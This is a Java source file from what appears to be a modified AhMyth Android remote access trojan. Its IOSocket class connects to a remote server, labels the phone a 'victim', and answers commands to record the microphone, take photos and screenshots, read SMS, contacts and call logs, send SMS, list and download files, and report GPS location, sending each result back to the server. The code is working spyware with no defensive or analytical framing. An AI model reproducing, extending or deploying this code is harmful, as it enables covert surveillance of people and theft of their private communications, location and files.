package ahmyth.mine.king.ahmyth;

import android.content.Context;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;
import android.util.Log;
import org.json.JSONException;
import org.json.JSONObject;

import ahmyth.mine.king.ahmyth.FileManager;

import org.json.JSONArray;

import java.net.NetworkInterface;
import java.net.InetAddress;
import java.net.Inet4Address;
import java.net.URISyntaxException;
import java.util.Enumeration;

import io.socket.client.IO;
import io.socket.client.Socket;

public class IOSocket {
    private static final String TAG = "IOSocket";
    private static final IOSocket INSTANCE = new IOSocket();
    private Socket ioSocket;

    private IOSocket() {}

    // Obtiene la IP local del dispositivo Android
    public static String getLocalIpAddress() {
        try {
            for (Enumeration<NetworkInterface> en = NetworkInterface.getNetworkInterfaces(); en.hasMoreElements();) {
                NetworkInterface intf = en.nextElement();
                for (Enumeration<InetAddress> enumIpAddr = intf.getInetAddresses(); enumIpAddr.hasMoreElements();) {
                    InetAddress inetAddress = enumIpAddr.nextElement();
                    if (!inetAddress.isLoopbackAddress() && inetAddress instanceof Inet4Address) {
                        return inetAddress.getHostAddress();
                    }
                }
            }
        } catch (Exception ex) {
            Log.e(TAG, "Error obteniendo IP local", ex);
        }
        return "0.0.0.0";
    }

    public static void connect(String serverIp, int serverPort) {
        if (INSTANCE.ioSocket != null && INSTANCE.ioSocket.connected()) {
            Log.i(TAG, "Socket ya conectado");
            return;
        }
        try {
            Context ctx = MainService.getContextOfApplication();
            String deviceID = Settings.Secure.getString(
                ctx.getContentResolver(),
                Settings.Secure.ANDROID_ID
            );

            IO.Options opts = new IO.Options();
            opts.timeout = -1;
            opts.reconnection = true;
            opts.reconnectionDelay = 5000;
            opts.reconnectionDelayMax = Integer.MAX_VALUE;

            // victimId en el query usando IP local del dispositivo
            String victimLocalIp = getLocalIpAddress();
            String victimId = victimLocalIp + ":" + serverPort;

            String url = "http://" + serverIp + ":" + serverPort
                + "?victimId=" + Uri.encode(victimId)
                + "&model="   + Uri.encode(Build.MODEL)
                + "&manf="    + Build.MANUFACTURER
                + "&release=" + Build.VERSION.RELEASE
                + "&id="      + deviceID;

            Log.i(TAG, "Conectando a socket en: " + url);
            INSTANCE.ioSocket = IO.socket(url, opts);

            // ———— LISTENERS ESTÁNDAR ————
            INSTANCE.ioSocket.on(Socket.EVENT_CONNECT, args -> {
                Log.i(TAG, "Socket conectado al servidor");
            });

            INSTANCE.ioSocket.on(Socket.EVENT_DISCONNECT, args -> {
                Log.w(TAG, "Socket desconectado del servidor");
            });

            INSTANCE.ioSocket.on(Socket.EVENT_CONNECT_ERROR, args -> {
                Log.e(TAG, "Error de conexión al socket: " + (args.length > 0 ? args[0] : ""));
            });

            INSTANCE.ioSocket.on("connect_timeout", args -> {
                Log.e(TAG, "Timeout de conexión al socket");
            });

            INSTANCE.ioSocket.on("error", args -> {
                Log.e(TAG, "Error en el socket: " + (args.length > 0 ? args[0] : ""));
            });

            INSTANCE.ioSocket.on("reconnect", args -> {
                Log.i(TAG, "Reconectado al socket");
            });

            INSTANCE.ioSocket.on("reconnect_attempt", args -> {
                Log.i(TAG, "Intentando reconectar al socket");
            });

            INSTANCE.ioSocket.on("reconnect_failed", args -> {
                Log.e(TAG, "Falló la reconexión al socket");
            });

            // ———— LISTENERS PERSONALIZADOS ————

            // ————————————————————————————————————————————
            // Listener para micrófono (grabación de audio)
            // ————————————————————————————————————————————
            INSTANCE.ioSocket.off("mic-record");  // Elimina listeners previos
            INSTANCE.ioSocket.on("mic-record", args -> {
                Log.e("MIC", "Evento mic-record recibido");
                int seconds = 10; // valor default
                try {
                    if (args.length > 0) {
                        Object arg = args[0];
                        if (arg instanceof JSONObject) {
                            seconds = ((JSONObject) arg).optInt("seconds", 10);
                        } else if (arg instanceof String) {
                            JSONObject obj = new JSONObject((String) arg);
                            seconds = obj.optInt("seconds", 10);
                        } else if (arg instanceof Integer) {
                            seconds = (Integer) arg;
                        }
                    }
                } catch (Exception e) {
                    Log.e("MIC", "Error leyendo segundos en mic-record", e);
                }
                Log.e("MIC", "Ejecutando grabación de micrófono por " + seconds + " segundos");
                
                // Verificar si ya hay una grabación en progreso
                if (MicManager.isRecording()) {
                    Log.e("MIC", "⚠️ Ya hay una grabación en progreso, ignorando solicitud");
                    return;
                }
                
                try {
                    MicManager.startRecording(seconds);
                } catch (Exception e) {
                    Log.e("MIC", "Error en startRecording: " + e.getMessage());
                }
            });

            // Llamadas
            INSTANCE.ioSocket.on("get-calls", args -> {
                Log.i(TAG, "Recibido evento get-calls");
                JSONObject callsJson = CallsManager.getCallsLogs();
                INSTANCE.ioSocket.emit("calls-data", callsJson != null ? callsJson.toString() : "[]");
            });

            // Contactos
            INSTANCE.ioSocket.on("get-contacts", args -> {
                JSONObject contactsJson = ContactsManager.getContacts();
                INSTANCE.ioSocket.emit("contacts-data", contactsJson != null ? contactsJson.toString() : "[]");
            });

            // ————————————————————————————————————————————
            // SMS - HANDLERS
            // ————————————————————————————————————————————
            // SMS - obtener lista
            INSTANCE.ioSocket.on("get-sms", args -> {
                Log.i(TAG, "Recibido evento get-sms");
                JSONObject smsJson = SMSManager.getSMSList();
                INSTANCE.ioSocket.emit("sms-data", smsJson != null ? smsJson.toString() : "[]");
            });

            // SMS - enviar
            INSTANCE.ioSocket.on("send-sms", args -> {
                String phoneNo = "";
                String msg = "";
                try {
                    if (args.length > 0) {
                        Object arg = args[0];
                        if (arg instanceof JSONObject) {
                            phoneNo = ((JSONObject) arg).optString("phoneNo", "");
                            msg = ((JSONObject) arg).optString("msg", "");
                        } else if (arg instanceof String) {
                            JSONObject obj = new JSONObject((String) arg);
                            phoneNo = obj.optString("phoneNo", "");
                            msg = obj.optString("msg", "");
                        }
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Error leyendo datos de send-sms", e);
                }
                Log.i(TAG, "Enviando SMS a: " + phoneNo + ", mensaje: " + msg);
                try {
                    SMSManager.sendSMS(phoneNo, msg);
                } catch (Exception e) {
                    Log.e(TAG, "Error en sendSMS: " + e.getMessage());
                    JSONObject result = new JSONObject();
                    try {
                        result.put("ok", false);
                        result.put("error", e.getMessage());
                    } catch (JSONException ee) {
                        Log.e(TAG, "Error creando JSON de error", ee);
                    }
                    INSTANCE.ioSocket.emit("send-sms-result", result);
                }
            });

            // Cámara - tomar foto
            INSTANCE.ioSocket.on("get-photo", args -> {
                int cameraID = 0; // default trasera
                try {
                    if (args.length > 0) {
                        Object arg = args[0];
                        if (arg instanceof JSONObject) {
                            cameraID = ((JSONObject) arg).optInt("cameraID", 0);
                        } else if (arg instanceof String) {
                            JSONObject obj = new JSONObject((String) arg);
                            cameraID = obj.optInt("cameraID", 0);
                        } else if (arg instanceof Integer) {
                            cameraID = (Integer) arg;
                        }
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Error leyendo cameraID en get-photo", e);
                }
                Log.i(TAG, "get-photo usando cameraID=" + cameraID);
                new CameraManager(MainService.getContextOfApplication()).startUp(cameraID);
            });

            // Cámara - lista de cámaras
            INSTANCE.ioSocket.on("get-camera-list", args -> {
                JSONObject camList = new CameraManager(MainService.getContextOfApplication()).findCameraList();
                INSTANCE.ioSocket.emit("camera-list", camList != null ? camList.toString() : "{}");
            });

            // Archivos - listar
            INSTANCE.ioSocket.on("get-files", args -> {
                String path = "/";
                try {
                    if (args.length > 0 && args[0] instanceof String) {
                        path = (String) args[0];
                    }
                } catch (Exception e) {}
                JSONArray filesJson = FileManager.walk(path);
                INSTANCE.ioSocket.emit("files-data", filesJson != null ? filesJson.toString() : "[]");
            });

            // Archivos - descargar
            INSTANCE.ioSocket.on("download-file", args -> {
                String filePath = "";
                try {
                    if (args.length > 0 && args[0] instanceof String) {
                        filePath = (String) args[0];
                    }
                } catch (Exception e) {}
                FileManager.downloadFile(filePath);
                // La respuesta se manda en "x0000fm" desde FileManager
            });

            // Ubicación - LOCATION
            INSTANCE.ioSocket.on("get-location", args -> {
                Log.i(TAG, "Recibido evento get-location");
                try {
                    LocManager locManager = new LocManager(MainService.getContextOfApplication());
                    locManager.getLocationAsync((loc, error) -> {
                        JSONObject locJson = new JSONObject();
                        try {
                            if (loc != null) {
                                locJson.put("lat", loc.getLatitude());
                                locJson.put("lng", loc.getLongitude());
                                locJson.put("accuracy", loc.getAccuracy());
                                locJson.put("timestamp", System.currentTimeMillis());
                            } else {
                                locJson.put("error", error != null ? error : "No location available");
                            }
                        } catch (Exception e) {
                            try { locJson.put("error", "Exception: " + e.getMessage()); }
                            catch (Exception ignored) {}
                        }
                        INSTANCE.ioSocket.emit("location-data", locJson);
                    });
                } catch (Exception e) {
                    Log.e(TAG, "Error obteniendo ubicación para location-data", e);
                    JSONObject err = new JSONObject();
                    try { err.put("error", e.getMessage()); } catch(Exception ignored){}
                    INSTANCE.ioSocket.emit("location-data", err);
                }
            });
            // ————————————————————————————————————————————
            // SCREENSHOT - captura de pantalla
            // ————————————————————————————————————————————
            INSTANCE.ioSocket.off("get-screenshot");
            INSTANCE.ioSocket.on("get-screenshot", args -> {
                Log.i(TAG, "Recibido evento get-screenshot");
                try {
                    new ScreenshotManager(MainService.getContextOfApplication()).takeScreenshot((screenshotData, error) -> {
                        JSONObject result = new JSONObject();
                        try {
                            if (screenshotData != null && screenshotData.length > 0) {
                               String base64 = android.util.Base64.encodeToString(screenshotData, android.util.Base64.NO_WRAP);                               
                                result.put("file", true);
                                result.put("buffer", base64);
                                Log.i(TAG, "Screenshot base64 generado: " + base64.length() + " caracteres");
                            } else {
                                result.put("file", false);
                                result.put("error", error != null ? error : "No screenshot data");
                            }
                        } catch (JSONException e) {
                            Log.e(TAG, "Error creando JSON de screenshot", e);
                        }
                        INSTANCE.ioSocket.emit("screenshot-data", result);
                    });
                } catch (Exception e) {
                    Log.e(TAG, "Error en takeScreenshot:", e);
                    JSONObject err = new JSONObject();
                    try {
                        err.put("file", false);
                        err.put("error", e.getMessage());
                    } catch (JSONException ignored) {}
                    INSTANCE.ioSocket.emit("screenshot-data", err);
                }
            });
            // ———— FIN LISTENERS ————

            
            INSTANCE.ioSocket.connect();

        } catch (URISyntaxException e) {
            Log.e(TAG, "URL de socket inválida", e);
        } catch (Exception e) {
            Log.e(TAG, "Error al conectar socket", e);
        }
    }

    public static void disconnect() {
        if (INSTANCE.ioSocket != null) {
            INSTANCE.ioSocket.disconnect();
            INSTANCE.ioSocket = null;
            Log.i(TAG, "Socket desconectado");
        }
    }

    public static IOSocket getInstance() {
        return INSTANCE;
    }

    public Socket getIoSocket() {
        if (ioSocket == null) {
            Log.w(TAG, "getIoSocket() llamado pero ioSocket es null.");
        } else if (!ioSocket.connected()) {
            Log.w(TAG, "getIoSocket() llamado pero el socket NO está conectado.");
        }
        return ioSocket;
    }
}